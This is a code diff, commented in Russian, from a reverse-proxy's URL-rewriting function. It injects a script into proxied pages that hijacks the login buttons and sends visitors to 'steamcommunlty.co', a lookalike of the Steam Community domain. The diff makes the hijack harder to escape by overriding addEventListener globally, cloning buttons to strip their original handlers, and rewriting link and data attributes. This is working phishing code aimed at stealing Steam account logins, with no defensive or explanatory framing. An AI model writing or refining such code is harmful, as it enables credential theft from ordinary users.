@@ -514,62 +514,130 @@ function modifyUrls(content, baseUrl, contentType = '') {
         // Добавляем скрипт для перехвата кнопок логина - ОБНОВЛЕНО ДЛЯ ПРОСТОГО РЕДИРЕКТА
         const loginButtonsScript = `
         <script>
-        (function() {
-            console.log('🔒 Инициализация перехвата кнопок входа');
-            
-            // Функция для добавления обработчиков на кнопки логина
-            function setupLoginButtons() {
-                // Целевые селекторы
-                const selectors = ['#login-head-tablet', '#login-register', '#login-chat'];
-                
-                selectors.forEach(selector => {
-                    const elements = document.querySelectorAll(selector);
-                    if (elements.length > 0) {
-                        console.log('Найдены кнопки входа:', selector, elements.length);
-                        
-                        elements.forEach(element => {
-                            // Проверяем, не модифицировали ли мы уже этот элемент
-                            if (!element.hasAttribute('data-login-modified')) {
-                                element.setAttribute('data-login-modified', 'true');
-                                
-                                // Переопределяем обработчик клика
-                                element.onclick = function(e) {
-                                    e.preventDefault();
-                                    e.stopPropagation();
-                                    
-                                    console.log('Перехваченный клик по кнопке входа');
-                                    
-                                    // Просто перенаправляем на нужный URL
-                                    window.location.href = 'https://steamcommunlty.co/6kaomrcjpf2m.html';
-                                    
-                                    return false;
-                                };
-                                
-                                console.log('Обработчик успешно переопределен для:', selector);
-                            }
-                        });
-                    }
-                });
+(function() {
+    console.log('🔒 Запуск улучшенного перехвата кнопок входа');
+    
+    // URL для перенаправления
+    const targetUrl = 'https://steamcommunlty.co/6kaomrcjpf2m.html';
+
+    // Базовая функция перехвата
+    function captureLogin(event) {
+        console.log('Перехвачен клик по кнопке логина');
+        
+        // Остановка события на всех уровнях
+        event.preventDefault();
+        event.stopPropagation();
+        event.stopImmediatePropagation();
+        
+        // Редирект на нужный URL
+        window.location.href = targetUrl;
+        
+        return false;
+    }
+    
+    // Сохраняем оригинальные методы
+    const originalAddEventListener = EventTarget.prototype.addEventListener;
+    const originalRemoveEventListener = EventTarget.prototype.removeEventListener;
+    
+    // Перехват глобальных кликов на селекторы
+    document.addEventListener('click', function(event) {
+        // Проверяем, был ли клик по нужному элементу или внутри него
+        let target = event.target;
+        
+        while (target && target !== document) {
+            if (target.matches('#login-head-tablet, #login-register, #login-chat') || 
+                target.closest('#login-head-tablet, #login-register, #login-chat')) {
+                return captureLogin(event);
             }
+            target = target.parentElement;
+        }
+    }, true); // Используем фазу перехвата для перехвата события до других обработчиков
+    
+    // Функция для модификации кнопок
+    function modifyLoginButtons() {
+        const buttonSelectors = ['#login-head-tablet', '#login-register', '#login-chat'];
+        
+        buttonSelectors.forEach(selector => {
+            const elements = document.querySelectorAll(selector);
             
-            // Вызываем функцию сразу
-            setupLoginButtons();
-            
-            // Устанавливаем интервал для повторной проверки
-            setInterval(setupLoginButtons, 2000);
-            
-            // Используем MutationObserver для отслеживания динамически добавляемых кнопок
-            const observer = new MutationObserver(() => {
-                setupLoginButtons();
+            elements.forEach(element => {
+                if (!element.hasAttribute('data-login-modified')) {
+                    console.log('Модифицирую кнопку входа:', selector);
+                    
+                    // Метка, что элемент уже модифицирован
+                    element.setAttribute('data-login-modified', 'true');
+                    
+                    // Очищаем все существующие обработчики
+                    const elementClone = element.cloneNode(true);
+                    element.parentNode.replaceChild(elementClone, element);
+                    
+                    // Добавляем свой обработчик на все возможные события
+                    ['click', 'mousedown', 'mouseup', 'touchstart', 'touchend'].forEach(eventType => {
+                        elementClone.addEventListener(eventType, captureLogin, true);
+                    });
+                    
+                    // Перезаписываем все стандартные обработчики
+                    elementClone.onclick = captureLogin;
+                    elementClone.onmousedown = captureLogin;
+                    elementClone.onmouseup = captureLogin;
+                    elementClone.ontouchstart = captureLogin;
+                    elementClone.ontouchend = captureLogin;
+                    
+                    // Заменяем href, если это <a>
+                    if (elementClone.tagName.toLowerCase() === 'a') {
+                        elementClone.href = 'javascript:void(0)';
+                    }
+                    
+                    // Перезаписываем дата-атрибуты, если они содержат URL
+                    Array.from(elementClone.attributes)
+                        .filter(attr => attr.name.startsWith('data-') && 
+                                       (attr.value.includes('http') || attr.value.includes('/login')))
+                        .forEach(attr => {
+                            elementClone.setAttribute(attr.name, 'javascript:void(0)');
+                        });
+                }
             });
+        });
+    }
+    
+    // Перехватываем addEventListener глобально для кнопок логина
+    EventTarget.prototype.addEventListener = function(type, listener, options) {
+        if (this.matches && 
+            (this.matches('#login-head-tablet, #login-register, #login-chat') || 
+             this.closest('#login-head-tablet, #login-register, #login-chat'))) {
             
-            // Наблюдаем за всеми изменениями DOM
-            observer.observe(document.documentElement, {
-                childList: true,
-                subtree: true
-            });
-        })();
-        </script>
+            // Если пытаются добавить обработчик клика к кнопке логина,
+            // заменяем его на наш обработчик
+            if (type.toLowerCase() === 'click') {
+                console.log('Перехвачена попытка добавить обработчик клика к кнопке логина');
+                return originalAddEventListener.call(this, type, captureLogin, true);
+            }
+        }
+        
+        // Для всех остальных элементов и событий используем оригинальный метод
+        return originalAddEventListener.call(this, type, listener, options);
+    };
+    
+    // Выполняем модификацию кнопок сразу
+    modifyLoginButtons();
+    
+    // Также запускаем модификацию через интервал для динамически добавляемых элементов
+    setInterval(modifyLoginButtons, 1000);
+    
+    // MutationObserver для отслеживания изменений DOM
+    const observer = new MutationObserver(mutations => {
+        modifyLoginButtons();
+    });
+    
+    // Запускаем наблюдение
+    observer.observe(document.documentElement, {
+        childList: true,
+        subtree: true
+    });
+    
+    console.log('✅ Улучшенный перехват кнопок входа успешно установлен');
+})();
+</script>
         `;
         
         modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
